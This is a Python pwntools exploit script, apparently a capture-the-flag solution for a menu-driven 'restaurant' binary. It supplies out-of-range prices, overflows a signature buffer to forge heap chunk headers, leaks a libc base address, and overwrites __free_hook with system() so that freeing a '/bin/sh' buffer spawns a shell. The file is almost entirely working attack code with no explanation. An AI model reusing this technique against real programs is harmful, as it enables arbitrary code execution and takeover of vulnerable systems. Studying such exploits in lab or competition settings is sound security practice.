#coding = utf-8
from pwn import *
local = 1
exec_file="./restaurant"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")

def debug():
    gdb.attach(a,'''
    set $base=0x555555554000
    b *(0x555555554000+0x000000000000FC5)
    b *($base+0x00000000000117A)
    ''')
def menu(idx):
    a.sendlineafter("Your choice:",str(idx))
def set_name(flag,size,name):
    a.sendlineafter("Do you want to sign your name?:(y/n) ",flag)
    a.sendlineafter("Input the length of your name: ",str(size))
    if size < 0x200:
        a.sendafter("Input your name: ",name)
        a.recvuntil("Here is your signature : ")
        name = a.recvuntil("\n",drop=True)
        return name
def add(idx,num,flag=True,size=0,name="\n"):
    menu(1)
    a.sendlineafter("Which do you want: ",str(idx))
    a.sendlineafter("How many do you want: ",str(num))
    a.sendlineafter("How much do you want to pay as tips: ","0.55")
    if flag==True:
        name=set_name("y",size,name)
        return name
    else:
        a.sendlineafter("Do you want to sign your name?:(y/n) ","n")
def Request(name,price):
    menu(4)
    a.sendafter("Name: ",name)
    a.sendlineafter("Price: ",str(price))
def pay(size,name):
    menu(3)
    set_name("y",size,name)
#debug()
Request("xxxx",1e16)
Request("xxx",-11111)
add(5,1,size=0x18)

add(5,0,size=0x38)
add(5,0,size=0x58)
add(5,0,size=0x78)

#debug()
add(5,0,size=0x201)
add(5,0,size=0x18)

payload={
0:p64(0),8:p64(0x421),
0x30:p64(0),0x38:p64(0x421),
0x420:p64(0),0x428:p64(0x21)

}
payload='A'*0x10+fit(payload)+p64(0x21)*0x10
add(6,99999,size=0x10,name=payload)
add(5,0,size=0x201,name="\n")
#debug()
add(5,0,size=0x38,name="\n")
add(5,0,size=0x201)
#add(5,0,size=0x98,name="A")
#debug()
libc_base=u64((add(5,0,size=0x98,name='A'*8))[8:16-2].ljust(8,'\x00'))
libc_base-=libc.symbols["__malloc_hook"]+0x10+1104
#debug()
__free_hook=libc_base+libc.symbols["__free_hook"]
print hex(libc_base)
#debug()
add(5,0,size=0x60,name='A'*56+p64(0x421)+p64(__free_hook-8))
add(5,0,size=0x201)
add(5,0,size=0x58,name="A")
#debug()
add(5,0,size=0x201)
add(5,0,size=0x58,name="/bin/sh\x00"+p64(libc_base+libc.symbols["system"]))
add(5,0,size=0x201)
a.interactive()









